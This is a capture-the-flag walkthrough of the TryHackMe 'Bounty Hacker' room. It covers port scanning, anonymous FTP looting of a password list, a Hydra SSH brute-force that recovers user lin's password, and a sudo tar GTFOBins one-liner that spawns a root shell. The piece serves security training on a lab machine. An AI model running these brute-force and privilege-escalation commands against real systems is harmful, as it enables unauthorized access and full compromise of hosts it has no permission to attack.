# [Bounty Hacker THM Room](https://tryhackme.com/room/cowboyhacker)
## Scanning
### Nmap
```python
nmap -sC -sV -oN nmapInitial [ip]
```

```python
# Nmap 7.60 scan initiated Mon Oct 23 17:29:25 2023 as: nmap -sC -sV -oN nmapInitial target-ip
Nmap scan report for ip-10-10-76-21.eu-west-1.compute.internal (target-ip)
Host is up (0.00028s latency).
Not shown: 967 filtered ports, 30 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
|_-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.17.165
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 5
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dc:f8:df:a7:a6:00:6d:18:b0:70:2b:a5:aa:a6:14:3e (RSA)
|   256 ec:c0:f2:d9:1e:6f:48:7d:38:9a:e3:bb:08:c4:0c:c9 (ECDSA)
|_  256 a4:1a:15:a5:d4:b1:cf:8f:16:50:3a:7d:d0:d8:13:c2 (EdDSA)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
MAC Address: 02:F5:A8:26:B0:43 (Unknown)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Oct 23 17:29:53 2023 -- 1 IP address (1 host up) scanned in 28.09 seconds
```

### Gobuster
```
gobuster dir -u http://[ip] -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

```python
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://target-ip
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2023/10/23 17:30:59 Starting gobuster
===============================================================
/images (Status: 301)
/server-status (Status: 403)
===============================================================
2023/10/23 17:31:25 Finished
===============================================================
```

### Netcat
#### Banner Grabbing
```
nc -vn [ip] 21
```

---
## Enumeration
### Port 80
- When we visit the webpage through our browser, we are greeted with the following:

![Port 80 Bounty Hacker](https://github.com/morganbritt19/CTF-Writeups/assets/60797871/b7d0b1be-c73e-4264-8a3b-f72818e8d1c2)


- After doing a quick Gobuster scan, we can see that there is a `/images` directory. However, after further enumeration, it doesn't seem to provide us with more information. 

### Port 21
- Anonymous FTP login is enabled. Once connected, we can see two `.txt` files that could be useful. Use the `get` command to pull down the `locks.txt` and `tasks.txt` files. 
```python
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
226 Directory send OK.
ftp> get locks.txt
local: locks.txt remote: locks.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for locks.txt (418 bytes).
226 Transfer complete.
418 bytes received in 0.07 secs (5.7458 kB/s)
ftp> get task.txt
local: task.txt remote: task.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for task.txt (68 bytes).
226 Transfer complete.
68 bytes received in 0.07 secs (1.0093 kB/s)
ftp> 
```

- `locks.txt`
```
rEddrAGON
ReDdr4g0nSynd!cat3
Dr@gOn$yn9icat3
R3DDr46ONSYndIC@Te
ReddRA60N
R3dDrag0nSynd1c4te
dRa6oN5YNDiCATE
ReDDR4g0n5ynDIc4te
R3Dr4gOn2044
RedDr4gonSynd1cat3
R3dDRaG0Nsynd1c@T3
Synd1c4teDr@g0n
reddRAg0N
REddRaG0N5yNdIc47e
Dra6oN$yndIC@t3
4L1mi6H71StHeB357
rEDdragOn$ynd1c473
DrAgoN5ynD1cATE
ReDdrag0n$ynd1cate
Dr@gOn$yND1C4Te
RedDr@gonSyn9ic47e
REd$yNdIc47e
dr@goN5YNd1c@73
rEDdrAGOnSyNDiCat3
r3ddr@g0N
ReDSynd1ca7e
```
- This looks like a potential password list that could come in handy for brute forcing later. 

- `task.txt`
```
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-lin
```
- Lin could be a potential username we could use to brute for the SSH or FTP service that is open on the machine. 

### Hydra
- We can use the following syntax to try and brute force SSH login with the password list and username we found:
```
hydra -l lin -P locks.txt ssh://target-ip
```

- We are returned the following output with a match for credentials that will allow us to log in under the Lin user:
```python
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2023-10-23 17:45:59
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 26 login tries (l:1/p:26), ~2 tries per task
[DATA] attacking ssh://target-ip:22/
[22][ssh] host: target-ip   login: lin   password: RedDr4gonSynd1cat3
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 3 final worker threads did not complete until end.
[ERROR] 3 targets did not resolve or could not be connected
[ERROR] 16 targets did not complete
Hydra (http://www.thc.org/thc-hydra) finished at 2023-10-23 17:46:02
```

---
## System Hacking
- Using the user/password combination we found with Hydra, we can log in via SSH. This will give us the user flag.

---
## Privilege Escalation
- Now that we have logged into the Lin user, let's look at what she can do with `sudo` permissions. 
```bash
lin@bountyhacker:~/Desktop$ sudo -l
[sudo] password for lin: 
Matching Defaults entries for lin on bountyhacker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lin may run the following commands on bountyhacker:
    (root) /bin/tar
```

- We can see that the Lin user can run `/bin/tar` as root. We can look this up using GTFOBins. When we do, we can find the following syntax to spawn a root shell:
```bash
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

- Now that we have root permissions, we can grab the `root.txt` flag on the `root` desktop.
- 
